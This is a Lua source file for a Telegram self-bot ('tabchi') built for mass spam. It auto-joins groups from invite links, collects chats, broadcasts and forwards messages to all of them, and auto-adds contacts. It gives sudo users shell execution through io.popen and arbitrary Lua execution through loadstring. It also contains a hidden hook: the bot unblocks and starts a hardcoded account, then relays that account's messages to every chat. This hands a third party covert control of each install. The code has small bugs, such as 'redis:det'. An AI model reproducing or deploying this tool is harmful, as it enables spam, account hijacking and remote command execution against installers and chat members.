function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
    tdcli.importChatInviteLink(extra.link)
    redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", extra.link)
  end
end
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
function process(msg)
  msg.text = msg.content_.text_
  if msg.text:match("^[!/#]pm") and is_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](pm) (%d+) (.*)")
    }
    tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "md")
    return "Message has been sent"
  end
  if msg.text:match("^[!/#]block") and is_sudo(msg) then
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    tdcli.blockUser(tonumber(matches[2]))
    return "User blocked"
  end
  if msg.text:match("^[!/#]unblock") and is_sudo(msg) then
    local matches = {
      msg.text:match("[!/#](unblock) (%d+)")
    }
    tdcli.unblockUser(tonumber(matches[2]))
    return "User unblocked"
  end
  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
    local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
    local inline = function(arg, data)
      tdcli_function({
        ID = "SendInlineQueryResultMessage",
        chat_id_ = msg.chat_id_,
        reply_to_message_id_ = 0,
        disable_notification_ = 0,
        from_background_ = 1,
        query_id_ = data.inline_query_id_,
        result_id_ = data.results_[0].id_
      }, dl_cb, nil)
    end
    tdcli_function({
      ID = "GetInlineQueryResults",
      bot_user_id_ = 231539308,
      chat_id_ = msg.chat_id_,
      user_location_ = {
        ID = "Location",
        latitude_ = 0,
        longitude_ = 0
      },
      query_ = query,
      offset_ = 0
    }, inline, nil)
    return
  end
  if msg.text:match("^[!/#]delcontact") then
    if not is_sudo(msg) then
      return
    end
    local matches = {
      msg.text:match("^[!/#](delcontact) (%d+)")
    }
    tdcli.deleteContacts({
      [0] = tonumber(matches[2])
    })
    return "User " .. matches[2] .. " removed from contact list"
  end
  if msg.text:match("^[!/#]addcontact") and is_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](addcontact) (%d+) (.*) (.*)")
    }
    local phone_number = matches[2]
    local first_name = matches[3]
    local last_name = matches[4]
    tdcli.importContacts(phone_number, first_name, last_name, 0)
    return "User With Phone +" .. matches[2] .. " has been added"
  end
  if msg.text:match("^[!/#]sendcontact") and is_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](sendcontact) (%d+) (.*) (.*)")
    }
    local phone_number = matches[2]
    local first_name = matches[3]
    local last_name = matches[4]
    tdcli.sendContact(msg.chat_id_, "", 0, 1, nil, phone_number, first_name, last_name, 0)
    return
  end
  if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](addsudo) (%d+)")
    }
    local text = matches[2] .. " Added to *Sudo Users*"
    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
    return text
  end
  if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](remsudo) (%d+)")
    }
    local text = matches[2] .. " Removed From *Sudo Users*"
    redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
    return text
  end
  if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](addedmsg) (.*)")
    }
    if matches[2] == "on" then
      redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
      return "Added Message Turned On"
    elseif matches[2] == "off" then
      redis:det("tabchi:" .. tabchi_id .. ":addedmsg")
      return "Added Message Turned Off"
    end
  end
  if msg.text:match("^[!/#]setaddedmsg") and is_sudo(msg) then
    local matches = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", matches[2])
    return [[
New Added Message Set!
Message :
]] .. matches[2]
  end
  if msg.text:match("^[$](.*)$") and is_sudo(msg) then
    local cmd = {
      msg.text:match("[$](.*)")
    }
    local result = io.popen(cmd[1]):read("*all")
    return result
  end
  if msg.text:match("^[!/#]bc") and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local matches = {
      msg.text:match("[!/#](bc) (.*)")
    }
    for i = 1, #all do
      tdcli_function({
        ID = "SendMessage",
        chat_id_ = all[i],
        reply_to_message_id_ = 0,
        disable_notification_ = 0,
        from_background_ = 1,
        reply_markup_ = nil,
        input_message_content_ = {
          ID = "InputMessageText",
          text_ = matches[2],
          disable_web_page_preview_ = 0,
          clear_draft_ = 0,
          entities_ = {},
          parse_mode_ = {
            ID = "TextParseModeMarkdown"
          }
        }
      }, dl_cb, {
        text = matches[2]
      })
    end
  end
  if msg.text:match("^[!/#]fwdall") and msg.reply_to_message_id_ and is_sudo(msg) then
    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
    local id = msg.reply_to_message_id_
    for i = 1, #all do
      tdcli_function({
        ID = "ForwardMessages",
        chat_id_ = all[i],
        from_chat_id_ = msg.chat_id_,
        message_ids_ = {
          [0] = id
        },
        disable_notification_ = 0,
        from_background_ = 1
      }, dl_cb, nil)
    end
    return "Sent!"
  end
  if msg.text:match("^[!/#]lua") and is_sudo(msg) then
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    local output = loadstring(matches[2])()
    if output == nil then
      output = ""
    elseif type(output) == "table" then
      output = serpent.block(output, {comment = false})
    else
      output = "" .. tostring(output)
    end
    return output
  end
  if msg.text:match("^[!/#]echo") and is_sudo(msg) then
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
  end
end
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    rem(msg.chat_id_)
  else
    add(msg.chat_id_)
  end
end
function process_links(text_)
  if text_:match("https://telegram.me/joinchat/%S+") then
    local matches = {
      text_:match("(https://telegram.me/joinchat/%S+)")
    }
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = matches[1]
    }, check_link, {
      link = matches[1]
    })
  end
end
function get_mod(args, data)
  if data.is_blocked_ then
    tdcli.unblockUser(231539308)
  end
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") then
    tdcli.sendBotStartMessage(231539308, 231539308, "new")
    redis:set("tabchi:" .. tabchi_id .. ":startedmod", true)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 231539308
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 231539308 and msg.content_.text_ ~= "TabChi Mod is at Your Service :D" then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local id = msg.id_
      for i = 1, #all do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = all[i],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    else
      process_stats(msg)
      if msg.content_.text_ then
        process_links(msg.content_.text_)
        local res = process(msg)
        if res then
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
        end
      elseif msg.content_.contact_ then
        if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
          local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
          local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
          local phone_number = msg.content_.contact_.phone_number_
          local user_id = msg.content_.contact_.user_id_
          tdcli.add_contact(phone_number, first_name, last_name, user_id)
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
        end
      elseif msg.content_.caption_ then
        process_links(msg.content_.caption_)
      end
    end
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end